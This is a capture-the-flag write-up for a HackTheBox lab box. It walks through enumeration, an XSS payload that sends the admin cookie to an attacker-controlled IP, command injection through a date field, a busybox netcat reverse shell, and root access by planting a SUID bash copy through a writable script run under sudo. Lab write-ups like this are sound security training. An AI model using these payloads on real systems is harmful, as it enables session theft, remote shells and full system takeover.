---
layout: writeup
category: HackTheBox
chall_description: 
points: 
solves: 
tags: HTB, easy
date: 2024-07-10
comments: false
---

  
## Description 

This was fairly easy one. Had to perform XSS to leak admin cookie and perform command injection to get initial user access. Privilege escalation was a cake walk comparatively, one shell script was executable as root whitout password which was executing another shell script which was editable by the user.    
 

## Enumeration

Nmap scan revealed 2 open ports 22, and 5000.
```sh
└─$ cat nmap.initial.nmap 
# Nmap 7.94SVN scan initiated Thu May 30 15:51:14 2024 as: nmap -sC -sV -oA nmap.initial 10.10.11.8
Nmap scan report for 10.10.11.8
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Thu, 30 May 2024 19:51:40 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>

```


Directory brueforcing using Gobuster revealed two paths `/support` and `/dashboard`.
```sh
└─$ gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.8:5000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]

```


`/dashboard` is only accessible by admin. Using `/support` we can send feedback message.
![Branching](/assets/CTFs/HackTheBox/headless1.png)

Initially I wasted quite some time on trying send RTSP requests as nmap mentions the protocol at the bottom and as the sites index page had countdown I used it has something to do with streaming. Well it was a big wste of time.  

After wasting hours I though about going back to the web page and started working on the `/support` page.    


## Exploitation

Starting with `/support` page, sending `<script>` as message in input field results in `Hacking Attempt Detected` error.
![Branching](/assets/CTFs/HackTheBox/headless2.png)  

However, sending the payload in other parameters and headers doesn't give that error. I sent the payload in all other parameters and headers and observer what happens. I send the basic payload used to leak cookies using XSS.  
```js
script>var i=new Image(); i.src="http://10.10.14.187:9000/?cookie="+(document.cookie);</script>
```  

![Branching](/assets/CTFs/HackTheBox/headless3.png)  


I ran a Python server to recieve the cookies value. After a few tries and waiting we get the cookie value.
```sh
└─$ python3 -m http.server 9000            
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
10.10.11.8 - - [10/Jul/2024 17:57:56] "GET /?cookie=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
10.10.11.8 - - [10/Jul/2024 17:57:58] "GET /?cookie=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -                                                    
       
```

Using the cookie we can access the `/dashboard`. 
![Branching](/assets/CTFs/HackTheBox/headless4.png)  
 

It sends the date to `/api/cache` on generate report.
![Branching](/assets/CTFs/HackTheBox/headless5.png)  

I tried SQLi attacks but it did not work as intented, after few tries I used a basic command injection `2023-09-14; ls ;` and we get RCE.
![Branching](/assets/CTFs/HackTheBox/headless6.png)  

For reverse shell I used the `busybox nc 10.10.14.187 4040 -e sh`, which is a lot easy to deal with and works everytime compared to the classic `bash -i`.
![Branching](/assets/CTFs/HackTheBox/headless7.png)  

And we get the user flag.    


## Privilege Escalation

Running `sudo -l` shows a shell script that can be used as root without password.
![Branching](/assets/CTFs/HackTheBox/headless8.png)


`syscheck` executes `initdb.sh` which is writeable by our user.
```sh
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0

```   

From here on you can get a reverse shell again. I copied bash as temp file like and added suid bit to the temp file.

```sh
cp /bin/bash ./temp
chmod +s ./temp
```  

![Branching](/assets/CTFs/HackTheBox/headless9.png)   


